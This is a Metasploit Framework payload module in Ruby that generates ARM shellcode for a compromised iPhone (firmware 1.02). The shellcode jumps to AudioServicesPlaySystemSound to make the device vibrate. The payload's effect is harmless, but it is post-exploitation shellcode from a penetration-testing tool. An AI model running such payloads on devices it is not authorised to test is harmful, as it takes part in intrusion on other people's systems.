##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf
module Payloads
module Singles
module Osx
module Armle

module PlaySystemSound

	include Msf::Payload::Single
	include Msf::Payload::Osx

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'OSX iPhone Vibrate',
			'Version'       => '$Revision$',
			'Description'   => %q|
				Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. 
				Based on work by Chris Miller <cmiller[at]securityevaluators.com>.
			|,
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_ARMLE))
	end

	def generate
		[
			0xe1a00820, #  mov r0, r0, lsr #16
			0xe51ff004, #  ldr pc, [pc, #-4]
			0x319ef974, #  _AudioServicesPlaySystemSound() / Firmware 1.02
			0x03ea4444  #  Parameter: 0x03ea
		].pack("V*")
	end

end

end end end end end
